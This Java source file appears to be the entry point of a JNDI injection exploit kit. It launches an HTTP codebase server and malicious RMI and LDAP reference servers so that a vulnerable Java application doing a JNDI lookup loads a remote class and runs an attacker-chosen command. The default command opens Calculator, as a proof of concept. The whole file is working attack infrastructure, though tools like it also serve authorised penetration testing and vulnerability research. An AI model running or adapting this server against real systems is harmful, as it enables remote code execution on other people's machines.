package run;

import jetty.JettyServer;
import jndi.LDAPRefServer;
import jndi.RMIRefServer;
import org.apache.commons.cli.*;
import org.apache.commons.lang3.StringUtils;

import java.net.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;

import static util.Mapper.*;

/**
 * @Classname run.ServerStart
 * @Description Start servers
 * @Author Welkin
 */
public class ServerStart {
    public static String addr = getLocalIpByNetcard();

    //default ports
    public static int rmiPort = 1099;
    public static int ldapPort = 1389;
    private static int jettyPort = 8180;

    private URL codebase;

    private JettyServer jettyServer;
    private RMIRefServer rmiRefServer;
    private LDAPRefServer ldapRefServer;

    public static void main(String[] args) throws Exception{

        CommandLineParser parser = new DefaultParser();
        CommandLine cmd = null;
        //default command
        String[] cmdArray = {"open","/Applications/Calculator.app"};

        try{
            cmd = parser.parse(cmdlineOptions(),args);
        }catch (Exception e){
            System.err.println("Cmdlines parse failed.");
            System.exit(1);
        }
        if(cmd.hasOption("C")) {
            cmdArray = cmd.getOptionValues('C');
        }
        if(cmd.hasOption("A")) {
            addr = cmd.getOptionValue('A');
        }

        ServerStart servers = new ServerStart(new URL("http://"+ addr +":"+ jettyPort +"/"),StringUtils.join(cmdArray," "));
        System.out.println("[ADDRESS] >> " + addr);
        System.out.println("[COMMAND] >> " + withColor(StringUtils.join(cmdArray," "),ANSI_BLUE));
        Class.forName("util.Mapper");

        System.out.println("----------------------------Server Log----------------------------");
        System.out.println(getLocalTime() + " [JETTYSERVER]>> Listening on 0.0.0.0:" + jettyPort);
        Thread threadJetty = new Thread(servers.jettyServer);
        threadJetty.start();

        System.out.println(getLocalTime() + " [RMISERVER]  >> Listening on 0.0.0.0:" + rmiPort);
        Thread threadRMI = new Thread(servers.rmiRefServer);
        threadRMI.start();

        Thread threadLDAP = new Thread(servers.ldapRefServer);
        threadLDAP.start();

    }

    public ServerStart(String cmd) throws Exception{
        this.codebase = new URL("http://"+ getLocalIpByNetcard() +":"+ jettyPort +"/");

        jettyServer = new JettyServer(jettyPort,cmd);
        rmiRefServer = new RMIRefServer(rmiPort, codebase, cmd);
        ldapRefServer = new LDAPRefServer(ldapPort,codebase);
    }

    public ServerStart(URL codebase, String cmd) throws Exception{
        this.codebase = codebase;

        jettyServer = new JettyServer(jettyPort,cmd);
        rmiRefServer = new RMIRefServer(rmiPort, codebase, cmd);
        ldapRefServer = new LDAPRefServer(ldapPort,this.codebase);
    }

    public static Options cmdlineOptions(){
        Options opts = new Options();
        Option c = new Option("C",true,"The command executed in remote .class.");
        c.setArgs(Option.UNLIMITED_VALUES);
        opts.addOption(c);
        Option addr = new Option("A",true,"The address of server(ip or domain).");
        opts.addOption(addr);
        return opts;
    }

    /**
     * 直接根据第一个网卡地址作为其内网ipv4地址
     *
     * @return
     */
    public static String getLocalIpByNetcard() {
        try {
            for (Enumeration<NetworkInterface> e = NetworkInterface.getNetworkInterfaces(); e.hasMoreElements(); ) {
                NetworkInterface item = e.nextElement();
                for (InterfaceAddress address : item.getInterfaceAddresses()) {
                    if (item.isLoopback() || !item.isUp()) {
                        continue;
                    }
                    if (address.getAddress() instanceof Inet4Address) {
                        Inet4Address inet4Address = (Inet4Address) address.getAddress();
                        return inet4Address.getHostAddress();
                    }
                }
            }
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * Get current time
     */
    public static String getLocalTime(){
        Date d = new Date();
        DateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return sdf.format(d);
    }

    public static Boolean isLinux(){
        return !System.getProperty("os.name").toLowerCase().startsWith("win");
    }

    public static String withColor(String str,String color){
        if (isLinux()) {
            return color + str + ANSI_RESET;
        }
        return str;
    }

}
